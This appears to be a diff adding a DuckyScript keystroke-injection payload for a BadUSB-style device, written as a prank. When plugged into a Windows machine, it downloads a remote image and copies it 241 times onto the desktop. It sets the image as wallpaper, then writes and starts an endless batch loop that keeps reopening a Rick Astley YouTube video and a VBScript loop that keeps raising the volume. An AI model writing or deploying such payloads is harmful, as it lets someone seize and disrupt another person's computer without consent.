@@ -1,0 +1,72 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 2000
+
+STRING powershell -Command "$imageUrl = 'https://wlos.com/resources/media2/original/full/1600/center/80/e635f693-5147-4550-9736-1e3d524f0127-AP23172424137889.jpg'; $savePath = \"$env:USERPROFILE\Desktop\image.jpg\"; Invoke-WebRequest -Uri $imageUrl -OutFile $savePath;  1..241 | ForEach-Object { Copy-Item $savePath -Destination "$env:USERPROFILE\Desktop\image$_.jpg" }"
+ENTER
+DELAY 700
+
+
+STRING if exist rr.bat del /f /q rr.bat
+ENTER
+DELAY 500
+STRING if exist volup.vbs del /f /q volup.vbs
+ENTER
+
+
+DELAY 500
+STRING powershell -Command "$savePath = \"$env:USERPROFILE\Desktop\image.jpg\"; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", CharSet = CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, $savePath, (0x01 -bor 0x02))"
+
+DELAY 750
+ENTER 
+STRING copy con rr.bat
+ENTER
+STRING @ECHO OFF
+ENTER
+STRING :LOOP
+ENTER
+STRING start https://www.youtube.com/watch?v=jOTeBVtlnXU
+ENTER
+
+DELAY 500
+STRING :CHECK
+ENTER
+STRING tasklist /FI "WINDOWTITLE eq Rick Astley*" 2>NUL | find /I "Rick Astley" >NUL
+ENTER
+STRING if errorlevel 1 (
+ENTER
+STRING start https://www.youtube.com/watch?v=jOTeBVtlnXU
+ENTER
+STRING )
+ENTER
+STRING GOTO LOOP
+ENTER
+CTRL Z
+ENTER
+
+STRING cls && start rr.bat
+ENTER
+
+STRING copy con volup.vbs
+ENTER
+STRING do
+ENTER
+STRING Set WshShell = CreateObject("WScript.Shell")
+ENTER
+STRING WshShell.SendKeys(chr(&hAF)) ' Volume up key
+ENTER
+STRING WScript.Sleep 100 ' Wait 100 ms before next volume up
+ENTER
+STRING loop
+ENTER
+CTRL Z
+ENTER
+
+STRING start volup.vbs
+ENTER
+
+GUI DOWNARROW
+
